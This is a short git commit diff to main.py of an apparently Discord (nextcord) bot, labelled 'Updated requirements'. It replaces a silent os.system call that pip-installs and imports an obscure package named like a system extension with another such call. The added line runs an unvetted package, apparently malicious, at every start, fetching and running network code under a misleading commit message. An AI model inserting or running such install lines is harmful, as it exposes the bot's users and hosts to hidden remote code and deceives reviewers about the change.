f35d4b4549503a63e097e611d26a00fe0a7c1aa8
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 23:29:11 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syssqlitedbextension")
-import syssqlitedbextension
+os.system("pip install syscolouringsextV1")
+import syscolouringsextV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
